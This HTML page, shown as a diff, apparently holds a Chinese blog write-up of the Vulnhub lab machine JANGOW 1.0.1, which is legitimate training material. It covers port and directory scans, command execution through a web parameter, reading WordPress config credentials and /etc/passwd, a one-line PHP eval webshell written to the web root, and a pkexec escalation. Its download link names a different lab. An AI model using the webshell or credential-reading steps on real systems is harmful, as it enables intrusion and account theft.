@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Machines Name：Vulnhub - JANGOW: 1.0.1 Difficulty：easy   Download：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;the-planets-earth,755&#x2F; 信息收集1nmap -T4 -A  -vv -Pn 192.168.56.118  1234PORT   STATE  SERVICE REASON">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub - jangow WriteUp">
+<meta property="og:url" content="http://example.com/posts/3787765405/index.html">
+<meta property="og:site_name" content="Brich">
+<meta property="og:description" content="Machines Name：Vulnhub - JANGOW: 1.0.1 Difficulty：easy   Download：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;the-planets-earth,755&#x2F; 信息收集1nmap -T4 -A  -vv -Pn 192.168.56.118  1234PORT   STATE  SERVICE REASON">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/image-20220301144133097.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/image-20220301144212666.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/image-20220301144427391.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/image-20220301144620032.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/image-20220301144830618.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/image-20220301145233522.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/image-20220301145339541.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/image-20220301151923355.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/image-20220301152047714.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/image-20220301153939730.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/img/image-20220301154053993.png">
+<meta property="article:published_time" content="2022-02-25T06:34:27.000Z">
+<meta property="article:modified_time" content="2022-03-21T08:24:53.478Z">
+<meta property="article:author" content="lin">
+<meta property="article:tag" content="vulnhub Machines">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typro-1304950244.file.myqcloud.com/img/image-20220301144133097.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+    
+    <!-- title -->
+    <title>vulnhub - jangow WriteUp</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/877236972/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/3260537659/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/3787765405/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/3787765405/&text=vulnhub - jangow WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/3787765405/&title=vulnhub - jangow WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/3787765405/&is_video=false&description=vulnhub - jangow WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=vulnhub - jangow WriteUp&body=Check out this article: http://example.com/posts/3787765405/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/3787765405/&title=vulnhub - jangow WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/3787765405/&title=vulnhub - jangow WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/3787765405/&title=vulnhub - jangow WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/3787765405/&title=vulnhub - jangow WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/3787765405/&name=vulnhub - jangow WriteUp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/3787765405/&t=vulnhub - jangow WriteUp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">2.</span> <span class="toc-text">getshell</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        vulnhub - jangow WriteUp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-02-25T06:34:27.000Z" itemprop="datePublished">2022-02-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/vulnhub-Machines/" rel="tag">vulnhub Machines</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>Machines Name：Vulnhub - JANGOW: 1.0.1</p>
+<p>Difficulty：easy  </p>
+<p>Download：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A  -vv -Pn 192.168.56.118</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE  SERVICE REASON          VERSION</span><br><span class="line">21/tcp open   ftp     syn-ack ttl 128 vsftpd 3.0.3</span><br><span class="line">53/tcp closed domain  reset ttl 128</span><br><span class="line">80/tcp open   http    syn-ack ttl 128 Apache httpd 2.4.18</span><br></pre></td></tr></table></figure>
+
+<p>访问80端口是一个apache的目录，点击site目录跳转网站</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301144133097.png" alt="image-20220301144133097"></p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301144212666.png" alt="image-20220301144212666"></p>
+<p>目录扫描发现是wordpress的站点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.56.118/site/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301144427391.png" alt="image-20220301144427391"></p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301144620032.png" alt="image-20220301144620032"></p>
+<p>没什么很惊喜的东西，对网站本身功能进行一些测试，网站很简单，一个About页面、一个Projects页面、还有一个不清楚是什么功能的Buscar页面，Buscar这个点非常奇怪，可能突破口就在这。</p>
+<p>![image-20220301144830618](&#x2F;Users&#x2F;lin&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220301144830618.png)</p>
+<p>前两个都能正常跳转页面，当点击Buscar的时候，会出现空白页面，并且出现了一个Get请求参数，推测需要做一个传参，可能是任意文件读取&#x2F;包含？也可能是任意代码执行？</p>
+<p>读一下&#x2F;etc&#x2F;passwd没反应</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301144830618.png" alt="image-20220301145116809"></p>
+<p>尝试执行命令whoami有回显，确认此处可以执行任意系统命令，那不就简单了？直接反弹shell就行</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301145233522.png" alt="image-20220301145233522"></p>
+<p>在此之前先读一下user flag</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301145339541.png" alt="image-20220301145339541"></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>反弹了一波shell，发现弹不回来，应该目标机器做了防火墙策略之类的限制,只能在站内执行命令。</p>
+<p>想起来刚开始目录扫描到的wordpress的config.php文件，读取发现了账户和密码信息。</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301151923355.png" alt="image-20220301151923355"></p>
+<p>查看一下&#x2F;etc&#x2F;passwd看看有没有什么用户可以利用的，会不会有密码复用的一个问题</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301152047714.png" alt="image-20220301152047714"></p>
+<p>发现一个jangow01的普通用户，尝试使用密码abygurl69登录…没开22端口。。。。</p>
+<p>向网站目录写webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &lt;?php eval($_POST[&quot;pass&quot;]); &gt; 1.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301153939730.png" alt="image-20220301153939730"></p>
+<p>成功上马</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/img/image-20220301154053993.png" alt="image-20220301154053993"></p>
+<p>这个机器有点拉胯，shell一直弹不出来，是我手法有点问题，到此为止吧。。。。。。后面直接使用pkexec提权即可。</p>
+
+  </div>
+</article>
+
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/vlog/">vlog</a></li>
+         
+          <li><a href="/gallery/">Photo</a></li>
+         
+          <li><a href="/friends/">Friends</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">2.</span> <span class="toc-text">getshell</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/3787765405/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/3787765405/&text=vulnhub - jangow WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/3787765405/&title=vulnhub - jangow WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/3787765405/&is_video=false&description=vulnhub - jangow WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=vulnhub - jangow WriteUp&body=Check out this article: http://example.com/posts/3787765405/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/3787765405/&title=vulnhub - jangow WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/3787765405/&title=vulnhub - jangow WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/3787765405/&title=vulnhub - jangow WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/3787765405/&title=vulnhub - jangow WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/3787765405/&name=vulnhub - jangow WriteUp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/3787765405/&t=vulnhub - jangow WriteUp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: 'Ku71Pva4EFeKIH5y64LCYVwp-gzGzoHsz',
+            appKey: 'wqnsWKV8eVHemIwCa9vo9vRg',
+            placeholder: '快来评论一下吧',
+            avatar: 'robohash'
+        })
+    </script>
+
+    
+<!-- utterances Comments -->
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":200,"height":350,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
